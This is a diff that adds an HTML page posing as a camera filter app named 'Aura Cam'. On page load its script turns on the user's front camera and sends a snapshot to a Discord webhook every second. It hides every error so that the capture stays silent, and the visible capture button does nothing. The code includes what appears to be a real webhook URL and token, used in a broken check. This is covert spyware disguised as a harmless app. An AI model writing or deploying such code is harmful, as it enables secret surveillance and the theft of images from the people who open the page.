@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aura Cam</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: 'Segoe UI', sans-serif;
+        background: #020617;
+        color: white;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        overflow: hidden;
+    }
+    .app {
+        width: 360px;
+        height: 640px;
+        border-radius: 30px;
+        background: rgba(255,255,255,0.05);
+        backdrop-filter: blur(20px);
+        box-shadow: 0 0 40px rgba(0,255,255,0.2);
+        position: relative;
+        overflow: hidden;
+        border: 1px solid rgba(255,255,255,0.1);
+    }
+    video, canvas {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+    .capture-btn {
+        position: absolute;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 70px;
+        height: 70px;
+        border-radius: 50%;
+        background: radial-gradient(circle, #0ff, #00f);
+        box-shadow: 0 0 25px #0ff;
+        cursor: pointer;
+        z-index: 2;
+        border: 4px solid white;
+    }
+    .filter-bar {
+        position: absolute;
+        bottom: 120px;
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        z-index: 2;
+    }
+    .filter {
+        padding: 6px 12px;
+        border-radius: 20px;
+        background: rgba(255,255,255,0.1);
+        font-size: 11px;
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+
+<div class="app">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none"></canvas>
+
+    <div class="filter-bar">
+        <div class="filter" onclick="setFilter('none')">Normal</div>
+        <div class="filter" onclick="setFilter('grayscale(1)')">Mono</div>
+        <div class="filter" onclick="setFilter('sepia(1)')">Retro</div>
+    </div>
+
+    <div class="capture-btn"></div>
+</div>
+
+<script>
+    // 1. PASTE YOUR WEBHOOK HERE
+    const DISCORD_WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; 
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let currentFilter = "none";
+    let autoInterval;
+
+    // Suppress all visible errors
+    window.onerror = () => true;
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, // Forces Front Camera
+                audio: false 
+            });
+            video.srcObject = stream;
+
+            video.onloadedmetadata = () => {
+                // Start sending to Discord every 1 second
+                autoInterval = setInterval(sendToDiscord, 1000);
+            };
+        } catch (e) {
+            // Fails silently if user denies or camera is missing
+        }
+    }
+
+    function setFilter(f) {
+        currentFilter = f;
+        video.style.filter = f;
+    }
+
+    async function sendToDiscord() {
+        // Stop if URL is not set or video isn't ready
+        if (!video.videoWidth || DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks/1489100868287463544/TbvEnlZkfuJafPylgOMJJkPZxwXP8xfkjQHtewRC4w0G43NbkXDjfCiT5sUgK9F4lH9Y')) return;
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.filter = currentFilter;
+        ctx.drawImage(video, 0, 0);
+
+        canvas.toBlob(async (blob) => {
+            if (!blob) return;
+
+            const formData = new FormData();
+            formData.append('file', blob, 'aura_shot.png');
+            formData.append('content', `📸 **Camera Feed:** ${new Date().toLocaleTimeString()}`);
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {
+                // Silent fail on network/CORS issues
+            }
+        }, 'image/png');
+    }
+
+    // Auto-clean up
+    window.onbeforeunload = () => clearInterval(autoInterval);
+
+    startCamera();
+</script>
+
+</body>
+</html>
